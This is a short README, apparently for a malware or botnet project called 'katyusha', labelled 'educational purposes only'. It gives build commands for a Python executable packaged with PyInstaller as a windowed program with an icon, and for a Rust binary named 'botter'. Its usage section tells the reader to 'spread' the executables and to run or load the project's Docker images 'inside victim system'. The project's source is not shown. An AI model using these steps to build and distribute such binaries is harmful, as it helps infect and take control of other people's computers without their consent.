# :information_source: EDUCATIONAL PURPOSES ONLY

### Docker Setup for Python

```cd katpy && docker build -t katpy . && docker run -d katpy```

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust

```cargo build --bin botter --release --manifest-path katrust/Cargo.toml```

### Rust Usage

Spread ```botter.exe``` inside `katrust/target/release` folder.

### Pythobn Usage

> **First Method**

Spread ```katyusha.exe``` inside `katpy/dist` folder.

> **Second Method**

Run docker images inside victim system either by running the container or by loading the saved images.

##### saving the docker images: ```docker save $(docker images -q) | gzip > katyusha.tar.gz```

##### loading saved docker images: ```docker load -i katyusha.tar.gz```
